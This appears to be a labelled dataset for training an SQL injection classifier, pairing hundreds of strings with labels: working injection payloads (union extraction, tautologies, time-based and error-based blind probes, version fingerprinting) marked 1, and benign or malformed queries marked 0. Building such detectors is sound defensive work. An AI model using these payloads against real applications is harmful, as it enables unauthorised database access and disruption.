select * from users where id  =  '1' union select $ _,@@VERSION -- 1';1
-2307'   )    )     )   or 6872  =  6872 and    (    (     (  'fyok' like 'fyok;1
1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
-6165%'   )    )    union all select 5384#;1
SELECT * FROM car WHERE won IN  ( SELECT silver FROM general ) ;0
(  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) ;1
1   )    )     )   union all select null,null,null,null,null--;1
"-8060""  )   where 5290  =  5290 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --";1
1'  )   as bscn where 6907  =  6907;1
"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --";1
"-9553""  )   as geih where 6453  =  6453 or 8453  =  8159--";1
SELECT milkID AS ID, at AS spin FROM object;0
SELECT TOP 3 * FROM plus WHERE next = 'aside' SELECT * FROM create;0
1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr;1
"UPDATE customers SET description = '2023-01-01' WHERE price = 123;";0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--;1
1'  )   as mwpp where 6192  =  6192;1
SELECT TOP 3 * FROM full;0
UNION ALL SELECT 1,2,3,4,5--;1
SELECT essential ( s )  FROM like SELECT forgot ( s ) ;0
"SELECT description, price, email FROM inventory WHERE user_id = 'pending';";0
"INSERT INTO employees (user_id, status) VALUES ('john@example.com', 123);";0
1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--;1
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tiet"" like ""tiet";1
1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#;1
order by;1
"DELETE FROM inventory WHERE created_at = 456;";0
like;1
" select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1";1
SELECT AVG ( quickly )  FROM master  SELECT SUM ( vowel ) ;0
(  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ;1
#NAME?;1
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--";1
-3445 union all select 5505,5505,5505--;1
SELECT * FROM iron WHERE trail  BETWEEN 10 AND 20;0
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--;1
"-3707""   )    )     )   or 8571  =  8571--";1
""") or pg_sleep(5)--";1
"SELECT user_id, status, price, created_at FROM products WHERE price = 'pending';";0
-7240'   )    )    union all select 8064,8064,8064#;1
"admin"") or (""1""=""1""#";1
1'  )   as oknw where 8777  =  8777;1
"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --";1
SELECT MIN ( spell )  AS paid FROM essential;0
"SELECT name, email, status FROM products WHERE user_id = '2023-01-01';";0
') or sleep(5)=';1
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249;1
iif  (  1539  =  1539,1539,1/0  )  ;1
1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --;1
SELECT COUNT ( DISTINCT certainly )  FROM environment;0
"-9558"" where 7497  =  7497 or   (  2539  =  6484  )  *6484--";1
SELECT TOP 3 * FROM function WHERE sink = 'wait';0
"SELECT name, email, created_at FROM products WHERE price = 123;";0
"SELECT user_id FROM logs WHERE description = 123;";0
SELECT * FROM  ( SELECT instrument FROM busy ) ;0
-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--;1
ORDER BY 18--;1
"1%""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'rqbf'  =  'rqbf;1
SELECT * FROM divide WHERE went = 'selection' LIMIT 3;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#;1
"SELECT quantity, id, price, description FROM sessions WHERE status = '2023-01-01';";0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--;1
1'||  (  select 'xyft' from dual where 8250  =  8250 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||';1
1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --;1
or 1/*;1
SELECT orbit ( s )  FROM east LEFT JOIN;0
# from wapiti;1
';1
"1%""  )   union all select null--";1
"create user name identified by pass123 temporary tablespace temp default tablespace users;";1
UNION ALL SELECT SLEEP(5)--;1
||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )   ;1
1  )   waitfor delay '0:0:5' and   (  2993  =  2993;1
SELECT * FROM call;0
"1%""   )    )     )   and 7533  =  7533 and    (    (     (  ""%""  =  """;1
1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +';1
1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #;1
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy";1
(  case when 2646  =  8520 then 2646 else null end  ) ;1
1 or sleep  (  __TIME__  )  #;1
SELECT AVG ( television ) FROM thrown;0
"-1573""  )   union all select 3928,3928,3928,3928--";1
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'iuki'  =  'iuki;1
"-7831""   )    )    as krzi where 3798  =  3798 order by 1--";1
"UPDATE logs SET name = 456 WHERE quantity = 'active';";0
SELECT market ( s )  FROM putting SELECT save FROM present;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--;1
SELECT * FROM all WHERE solution = 'press' LIMIT 3;0
1-false;1
1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ;1
)   or true--;1
1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--;1
password:*/  =  1--;1
SELECT hot,valley FROM voyage WHERE north = 'smallest' UNION SELECT direct, hurried FROM rough;0
select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1';1
"UPDATE logs SET created_at = 456 WHERE email = 123;";0
1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg;1
1  )   as boed where 6787  =  6787;1
select   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
SELECT * FROM pile WHERE idea NOT LIKE 'most%';0
"""&""";1
1%'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #;1
"DELETE FROM sessions WHERE price = 'pending';";0
INSERT INTO poetry ( fall, practice, every, element, next, shown )  VALUES  ( 'example', 'room'. friend', 'aboard', 'expression', 'hat', 'engine' )  ;0
SELECT knew FROM basket UNION ALL SELECT impossible FROM heading ORDER BY announced;0
SELECT AVG ( Price ) FROM western;0
SELECT * FROM stopped WHERE safe = 'setting' FETCH FIRST 3 ROWS ONLY;0
"DELETE FROM users WHERE description = 'user123';";0
-2325  )   union all select 4692,4692,4692,4692#;1
SELECT * FROM ring WHERE bring = 'around' LIMIT 3;0
1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'yabn'  =  'yabn;1
-2936  )   or 6872  =  6872;1
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1";1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14;1
"INSERT INTO customers (user_id, email, description, created_at) VALUES ('john@example.com', 'user123', 123, 'user123');";0
1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --;1
(  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ;1
"SELECT price FROM customers WHERE quantity = 'active';";0
SELECT * FROM vast ORDER BY forest DESC;0
SELECT * FROM seeing WHERE there BETWEEN '1996-07-01' AND '1996-07-31';0
AND 7300=7300 AND ('pKlZ'='pKlZ;1
SELECT TOP 3 * FROM musical;0
SELECT setting, planned+ ', ' + movement+ ' ' + string+ ', ' + solid AS suggest  FROM stove;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--;1
-5313'  )   union all select 7187,7187,7187#;1
select * from users where id  =  1 or $<. union select 1,@@VERSION -- 1;1
"SELECT price, created_at, name, quantity FROM users WHERE name = 'user123';";0
1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #;1
'^';1
and (select substring(@@version,2,1))='i';1
UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--;1
"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #";1
-7648'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ;1
-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#;1
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1";1
SELECT stranger, adult+ ', ' + few+ ' ' + yet+ ', ' + chair AS friendly  FROM properly;0
1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098;1
1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #;1
SELECT * FROM decide WHERE interior NOT IN  ( 'space', 'author', 'meal' )  ;0
SELECT local, needed, ratherFROM law WHERE doctor  IS NOT NULL;0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""%""  =  """;1
"UPDATE orders SET email = 'active' WHERE status = 'user123';";0
-1372%'   )    )     )   union all select 8403,8403,8403,8403#;1
SELECT * FROM  ( SELECT maybe FROM moment ) ;0
1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --;1
"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """;1
SELECT skill ( s )  FROM worse UNION;0
"DELETE FROM logs WHERE created_at = 'pending';";0
``;1
"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--";1
"1%""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #";1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--;1
\;1
SELECT * FROM look WHERE were = 'possible' LIMIT 3;0
"hi' or 'x'  =  'x';";1
1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --;1
SELECT * FROM fall WHERE doctor NOT LIKE 'arrow%';0
1'||  (  select 'mdqc' where 4533  =  4533 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
SELECT several;0
"UPDATE orders SET price = 123 WHERE quantity = 123;";0
SELECT AVG ( however ) FROM hung;0
INSERT INTO thirty ( stems, prepare, sure, lovely, surface, food )  VALUES  ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )  ;0
SELECT travel,fog FROM manner WHERE ruler = 'search' UNION SELECT bow, mud FROM easily;0
1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--;1
-2960' or 2163  =  3143--;1
admin') or '1'='1'#;1
select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #;1
SELECT * FROM program ORDER BY slipped DESC;0
1'  )   as bihs where 4197  =  4197;1
"INSERT INTO customers (price, status) VALUES ('user123', 'pending');";0
1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --;1
-2411 or   (  8459  =  8459  )  *4906# pxwg;1
-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--;1
FROM  ( SELECT DISTINCT friendly FROM invented ) ;0
1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #;1
1'||  (  select 'hrpa' where 1973  =  1973 union all select null,null,null,null,null,null,null,null,null--;1
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'bwka'  =  'bwka;1
SELECT * FROM base ORDER BY symbol DESC;0
1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
1 where 7051  =  7051 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#;1
SELECT shinning ( s )  FROM upward UNION ALL;0
"UPDATE customers SET email = 'pending' WHERE name = 'pending';";0
SELECT volume ( s ) FROM girl INNER JOIN;0
"UPDATE employees SET id = 'john@example.com' WHERE email = 'active';";0
and (select substring(@@version,3,1))='c';1
ORDER BY 20--;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#;1
1',row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ;1
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'tmdj' like 'tmdj;1
1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
or 2 > 1;1
select * from users where id  =  1 +   (  .  )   or 1  =  1 -- 1;1
-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'otbq'  =  'otbq;1
"DELETE FROM orders WHERE user_id = 'active';";0
"UPDATE inventory SET id = 'user123' WHERE name = '2023-01-01';";0
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #;1
1 where 9872  =  9872;1
"UPDATE logs SET name = '2023-01-01' WHERE created_at = 'john@example.com';";0
"1""   )    )    as sdlv where 5922  =  5922 and 2006  =  2006";1
" select * from users where id  =  1 or ""%;"" or 1  =  1 -- 1";1
"UPDATE sessions SET name = 456 WHERE user_id = 'user123';";0
"1%""  )   rlike   (  select   (  case when   (  7736  =  7642  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """;1
(  select top 1;1
1'||  (  select 'ytwz' from dual where 3025  =  3025 and   (  5039  =  5303  )  *5303  )  ||';1
%' AND 8310=8311 AND '%'=';1
"1""   )    )    as uycc where 4364  =  4364 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
"INSERT INTO sessions (name, quantity) VALUES ('john@example.com', 456);";0
SELECT someone ( s FROM brief RIGHT JOIN;0
select case when 1613  =  2937 then 1 else null end--;1
ORDER BY 3#;1
INSERT INTO depth ( class, stuck, particles, sister, type, bell )  VALUES  ( 'swam', 'sick'. whatever', 'pleasant', 'foot', 'yesterday', 'wrong' )  ;0
"1""   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""wvlb"" like ""wvlb";1
"DELETE FROM employees WHERE description = 456;";0
"UPDATE customers SET price = '2023-01-01' WHERE id = 123;";0
select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--;1
"SELECT id, email, status, price FROM users WHERE price = 'Sample text';";0
"SELECT price FROM customers WHERE price = 'active';";0
UNION ALL SELECT 1,2;1
SELECT reach,pictured,model FROM shoot LEFT JOIN Orders ON wet.noonID =  record.lift ORDER BY pick.safety;0
"INSERT INTO sessions (status, id, name, quantity) VALUES ('active', 'pending', 'pending', 'user123');";0
1  )   as estm where 4809  =  4809 union all select null,null,null--;1
-9532   )    )    union all select 6039,6039,6039,6039--;1
"SELECT quantity FROM employees WHERE name = 'active';";0
1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #;1
SELECT * FROM bit WHERE voice = 'golden' FETCH FIRST 3 ROWS ONLY;0
1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'rpof' like 'rpof;1
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey";1
"DELETE FROM employees WHERE status = 'user123';";0
SELECT DISTINCT swimming FROM happily;0
" select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1";1
SELECT COUNT ( forest ) FROM visit;0
DELETE FROM door WHERE grow = 'small';0
INSERT INTO voice ( whatever, combine, direct, this, select, mine )  VALUES  ( 'widely', 'storm'. child', 'football', 'sun', 'bent', 'scale' )  ;0
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""duuw""  =  ""duuw";1
SELECT storm;0
"INSERT INTO products (description, name, created_at) VALUES ('user123', 123, 123);";0
-5362  )   union all select 7297,7297,7297,7297,7297#;1
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'acml' like 'acml;1
"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """;1
ORDER BY 19;1
SELECT * FROM increase WHERE pipe = 'nothing' LIMIT 3;0
-5320 where 8051  =  8051 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
1' ORDER BY 1,2,3--+;1
SELECT weather ( s )  FROM out SELECT am ( s ) ;0
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #;1
AND 7300=7300 AND 'pKlZ'='pKlY;1
1%' and make_set  (  8403  =  8403,8899  )   and '%'  =  ';1
DELETE FROM forty WHERE till = 'come';0
SELECT bill;0
"admin""  )   or ""1""  =  ""1""#";1
1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#;1
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl;1
1'||  (  select 'uqbj' from dual where 6736  =  6736 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --;1
SELECT looseID AS ID, built AS gift FROM laid;0
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4142  =  4142;1
SELECT AVG ( battle ) FROM shape SELECT SUM ( struggle ) ;0
1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy;1
UPDATE zebra SET mighty =  'ground', City =  'worried' WHERE press =  cent;0
SELECT MIN ( party )  AS writing FROM verb;0
1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  ';1
SELECT * FROM somehow  WHERE soldier = fairly;0
SELECT COUNT ( packID ) FROM police;0
1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||';1
" select * from users where id  =  1 or 1#""?  =  1 union select 1,version  (    )   -- 1";1
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1";1
SELECT space FROM garden;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27;1
"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg";1
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1";1
"INSERT INTO users (user_id, id) VALUES ('pending', '2023-01-01');";0
1' where 2389  =  2389 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --;1
"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#";1
SELECT MIN ( somewhere )  AS individual FROM held;0
-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#;1
"-8698"" where 1990  =  1990 or   (  8459  =  8459  )  *4906--";1
1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
SELECT * FROM helpful ORDER BY new, new;0
"SELECT price, email, quantity, name FROM users WHERE email = 'john@example.com';";0
1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct;1
1  )   as mtda where 3951  =  3951;1
SELECT * FROM prize WHERE west = 'source'  OR usually = 'riding';0
1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915;1
SELECT Count ( * )  AS education;0
"1""  )   and elt  (  1889  =  7397,7397  )   and   (  ""kuau""  =  ""kuau";1
SELECT COUNT ( height ) FROM studying;0
SELECT * FROM consider WHERE wrote NOT LIKE 'floor%';0
1'+  (  select ttae where 4601  =  4601 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +';1
1'   )    )    and 3814  =  4272--;1
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  ';1
"-3169"" order by 1#";1
or sleep  (  __TIME__  )    =  ';1
-9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616;1
1'+  (  select 'dpun' where 4760  =  4760;1
-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346;1
